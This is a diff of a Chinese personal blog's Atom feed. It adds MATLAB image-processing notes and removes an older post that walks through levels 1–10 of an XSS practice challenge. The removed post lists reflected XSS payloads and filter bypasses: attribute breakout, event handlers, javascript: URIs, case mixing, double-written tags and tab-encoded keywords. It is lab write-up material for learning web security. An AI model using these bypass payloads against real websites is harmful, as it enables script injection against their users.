@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://finsenty54.github.io/"/>
-  <updated>2020-02-05T05:42:28.598Z</updated>
+  <updated>2020-02-06T06:30:57.460Z</updated>
   <id>http://finsenty54.github.io/</id>
   
   <author>
@@ -15,6 +15,27 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>matlab图像示例笔记1</title>
+    <link href="http://finsenty54.github.io/2020/02/06/matlab%E5%9B%BE%E5%83%8F%E7%A4%BA%E4%BE%8B%E7%AC%94%E8%AE%B01/"/>
+    <id>http://finsenty54.github.io/2020/02/06/matlab图像示例笔记1/</id>
+    <published>2020-02-06T06:30:11.000Z</published>
+    <updated>2020-02-06T06:30:57.460Z</updated>
+    
+    <content type="html"><![CDATA[<h3 id="对比度"><a href="#对比度" class="headerlink" title="对比度"></a>对比度</h3><p>histogram  直方图<br>Precede the call to <code>imhist</code>with the <code>figure</code>command so that the histogram does not overwrite the display of the image I in the current figure window.</p><p>To see the distribution of intensities in the image, <code>create a histogram by calling the imhist</code> function.<br>输入图片，图片要求为灰度图或者二值图 imhist<br><a id="more"></a><br>    F=imread(‘test.jpg’);<br>    I=rgb2gray(F);<br>    [count,x]=imhist(I，30)</p><p><del>% 获取直方图的横坐标和纵坐标，即各个像素级，以及每个像素级上的像素出现的次数<br>figure;</del></p><pre><code>subplot(221);imhist(I,2);subplot(222);imhist(I,5);subplot(223);imhist(I,10);subplot(224);imhist(I);figure;subplot(121); imhist(I,10)[count,x] = imhist(I,10)subplot(122);stem(x,count);</code></pre><blockquote><p>stem<br>绘制离散序列数据</p></blockquote><p><code>Improve the contrast</code>in an image, using the <code>histeq function</code>. The toolbox includes several other functions that perform contrast adjustment, including <code>imadjust</code> and <code>adapthisteq</code>, and interactive tools such as the Adjust Contrast tool, available in the Image Viewer<br>adjust the contrast </p><blockquote><p>灰度直方图均衡化histeq</p></blockquote><hr><h3 id="Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects"><a href="#Correct-Nonuniform-Background-Illumination-and-Analyze-Foreground-Objects" class="headerlink" title="Correct Nonuniform Background Illumination and Analyze Foreground Objects"></a>Correct Nonuniform Background Illumination and Analyze Foreground Objects</h3><p>nonuniform</p><blockquote><p>strel（）<br>Morphological structuring element</p></blockquote><p><code>J = imopen(I,SE)</code>performs morphological opening on the grayscale or binary image I, returning the opened image, J. SE is a single structuring element object returned by the <code>strel or offsetstrel functions</code>. The morphological open operation is an erosion followed by a dilation, using the same structuring element for both operations.</p><p>surf<br>曲面图全页折叠<br>语法<br>surf(X,Y,Z)<br>surf(X,Y,Z,C)</p><p><code>f1=imadjust（f，[low_in  high_in],[low_out  high_out],gamma）</code><br>该函数的意义如图1所示，把图像f 灰度变换到新图像f1的过程中，f 中灰度值<code>低于low_in</code>的像素点在f1中灰度值被赋值为<code>low_out</code>,同理，f中灰度值<code>高于high_in</code>的像素点变换到f1时其灰度值也被赋值为<code>high_out</code>;</p><blockquote><p>J=imadjust(I,[0.2 0.5],[0 1])<br>原图像灰度范围为0-255，程序将小于255×0.2的灰度值设置为0，将大于255×0.5的灰度值设置为255</p></blockquote><p>饱和度取决于该色中含色成分和消色成分（灰色）的比例<br>比度指的是一幅图像中明暗区域最亮的白和最暗的黑之间不同亮度层级的测量，差异范围越大代表对比越大</p><p>Use the<code>imbinarize function</code> to convert the grayscale image into a<code>binary image</code></p><p><code>Remove background noise</code> from the image with the<code>bwareaopen function</code>.</p><p>F = false(sz1,…,szN) 是由逻辑值“0”组成的 sz1×…×szN 数组，其中 sz1,…,szN 表示每个维度的大小。例如，false(2,3) 返回由逻辑值“0”组成的 2×3 数组。</p>]]></content>
+    
+    <summary type="html">
+    
+      &lt;h3 id=&quot;对比度&quot;&gt;&lt;a href=&quot;#对比度&quot; class=&quot;headerlink&quot; title=&quot;对比度&quot;&gt;&lt;/a&gt;对比度&lt;/h3&gt;&lt;p&gt;histogram  直方图&lt;br&gt;Precede the call to &lt;code&gt;imhist&lt;/code&gt;with the &lt;code&gt;figure&lt;/code&gt;command so that the histogram does not overwrite the display of the image I in the current figure window.&lt;/p&gt;
+&lt;p&gt;To see the distribution of intensities in the image, &lt;code&gt;create a histogram by calling the imhist&lt;/code&gt; function.&lt;br&gt;输入图片，图片要求为灰度图或者二值图 imhist&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="matlab" scheme="http://finsenty54.github.io/tags/matlab/"/>
+    
+  </entry>
   
   <entry>
     <title>matlab笔记5 image</title>
@@ -452,29 +473,6 @@ Sections
     
     </summary>
     
-    
-  </entry>
-  
-  <entry>
-    <title>XSS 20关挑战</title>
-    <link href="http://finsenty54.github.io/2019/03/01/xss/"/>
-    <id>http://finsenty54.github.io/2019/03/01/xss/</id>
-    <published>2019-03-01T14:22:42.000Z</published>
-    <updated>2019-05-06T02:00:06.000Z</updated>
-    
-    <content type="html"><![CDATA[<h2 id="less1"><a href="#less1" class="headerlink" title="less1"></a>less1</h2><p>反射型XSS也被称为非持久性CSS<br>当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。</p><p>alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。</p><p>查看源码<code>window.alert = function()</code><br><code>echo &quot;&lt;h2 align=center&gt;欢迎用户&quot;.$str.&quot;&lt;/h2&gt;&quot;;</code>没有过滤<br>直接调用函数就可以通关<code>&lt;script&gt;window.alert()&lt;/script&gt;</code></p><p><em><code>&lt;script&gt;</code> 标签用于定义客户端脚本，比如 JavaScript。</em></p><a id="more"></a><hr><h2 id="less2"><a href="#less2" class="headerlink" title="less2"></a>less2</h2><p>利用页面元素看到输入在<code>&lt;input name=keyword  value=&quot;&#39;.$str.&#39;&quot;&gt;</code><br>闭合input语句即可<br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;</code><br><code>1&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code></p><p><a href="https://imgchr.com/i/kqT7Ed" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/03/kqT7Ed.png" alt="kqT7Ed.png"></a></p><hr><h2 id="less3"><a href="#less3" class="headerlink" title="less3"></a>less3</h2><p>查看页面元素<code>&lt;input name=keyword  value=&#39;1&#39;&gt;</code>在input语句里<br>尝试闭合无用<br>查看源码<code>str</code>都加上了<code>htmlspecialchars</code>函数，但默认配置是不过滤单引号的<br><code>&#39;onmouseover=&#39;window.alert()</code>即可</p><p>输入<code>&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; &#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>&#39;onclick&#39;</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick&#39;&#39;=&quot;&quot;&gt;</code><br>输入<code>onclick=</code> <code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; onclick=&quot;&quot;&gt;</code></p><hr><h2 id="less4"><a href="#less4" class="headerlink" title="less4"></a>less4</h2><p>输入<code>&quot;&gt;&lt;script&gt;alert()&lt;/script&gt;&lt;&quot;</code><br>查看可知<code>&lt;input name=&quot;keyword&quot; value=&quot;&quot; scriptalert()=&quot;&quot; script&quot;&quot;=&quot;&quot;&gt;</code>过滤了<code>&lt;</code> <code>&gt;</code><br>利用上节方法<br><code>&quot;onclick=&quot;alert()</code></p><p>更新于2019-03-03 11:19:50 星期日</p><hr><h2 id="less5"><a href="#less5" class="headerlink" title="less5"></a>less5</h2><p>试过后发现<code>onclick</code>变为<code>o_nclick</code><br><code>script</code>变为<code>sc_ript</code><br>使用<code>&quot;&gt;&lt;a href=&quot;javascript:alert()&quot;&gt;</code></p><hr><h2 id="less6"><a href="#less6" class="headerlink" title="less6"></a>less6</h2><p><code>onclick script href</code>输入后都进行了变化<br><code>&quot;&gt;&lt;a HRef=&quot;javascript:alert()&quot;&gt;</code><br><code>keyword=&quot;ONclick=&quot;alert()</code><br><code>keyword=&quot;&gt;&lt;scriPt&gt;alert()&lt;/SCRIpt&gt;&lt;&quot;</code><br><code>keyword=&quot;&gt;&lt;a HreF=javascript:alert()&gt;213&lt;/a&gt;&quot;&lt;</code><br>进行大小写替换可以</p><hr><h2 id="less7"><a href="#less7" class="headerlink" title="less7"></a>less7</h2><p><code>script</code>被过滤，改变大小写也没有用<br><code>on</code>被过滤<br><code>href</code>同样如此<br><code>keyword=&quot;&gt;&lt;scriscriptpt&gt;alert()&lt;/scrscriptipt&gt;&lt;&quot;</code><br>利用双写绕过</p><p>更新于2019-03-06 21:20:39 星期三</p><hr><h2 id="less8"><a href="#less8" class="headerlink" title="less8"></a>less8</h2><p>这题可以添加链接<br>直接使用<code>javascript:alert(1)</code><br>但并没有用，查看源码<code>$str2=str_replace(&quot;script&quot;,&quot;scr_ipt&quot;,$str);</code>被替换了<br>使用制表符绕过<code>%09</code><br><code>keyword=javasc%09ript%3Aalert%281%29&amp;submit=添加友情链接</code></p><hr><h2 id="less9"><a href="#less9" class="headerlink" title="less9"></a>less9</h2><p>上题结果没有用，查看源码<code>if(false===strpos($str7,&#39;http://&#39;))</code><br>知一定要有<code>http://</code><br>在javascript伪协议里面，属于js范畴，所以单行注释符是可以使用的<br><code>javasc%09ript%3Aalert%281%29//http://www.test.com</code></p><hr><h2 id="less10"><a href="#less10" class="headerlink" title="less10"></a>less10</h2><p>查看页面元素<br><a href="https://imgchr.com/i/AdFKeI" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/27/AdFKeI.th.png" alt="AdFKeI.th.png"></a><br>有几个隐藏的值，注入点就在这<br><code>keyword=test&amp;t_sort=&quot; type=&quot;text&quot; onclick=&quot;alert()</code><br><a href="https://imgchr.com/i/AdkZNV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/03/27/AdkZNV.th.png" alt="AdkZNV.th.png"></a></p><hr><h2 id="更新于2019-03-27-18-15-42-星期三"><a href="#更新于2019-03-27-18-15-42-星期三" class="headerlink" title="更新于2019-03-27 18:15:42 星期三"></a>更新于2019-03-27 18:15:42 星期三</h2>]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;less1&quot;&gt;&lt;a href=&quot;#less1&quot; class=&quot;headerlink&quot; title=&quot;less1&quot;&gt;&lt;/a&gt;less1&lt;/h2&gt;&lt;p&gt;反射型XSS也被称为非持久性CSS&lt;br&gt;当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。&lt;/p&gt;
-&lt;p&gt;alert() 方法用于显示带有一条指定消息和一个 OK 按钮的警告框。&lt;/p&gt;
-&lt;p&gt;查看源码&lt;code&gt;window.alert = function()&lt;/code&gt;&lt;br&gt;&lt;code&gt;echo &amp;quot;&amp;lt;h2 align=center&amp;gt;欢迎用户&amp;quot;.$str.&amp;quot;&amp;lt;/h2&amp;gt;&amp;quot;;&lt;/code&gt;没有过滤&lt;br&gt;直接调用函数就可以通关&lt;code&gt;&amp;lt;script&amp;gt;window.alert()&amp;lt;/script&amp;gt;&lt;/code&gt;&lt;/p&gt;
-&lt;p&gt;&lt;em&gt;&lt;code&gt;&amp;lt;script&amp;gt;&lt;/code&gt; 标签用于定义客户端脚本，比如 JavaScript。&lt;/em&gt;&lt;/p&gt;
-    
-    </summary>
-    
-    
-      <category term="xss" scheme="http://finsenty54.github.io/tags/xss/"/>
     
   </entry>
   
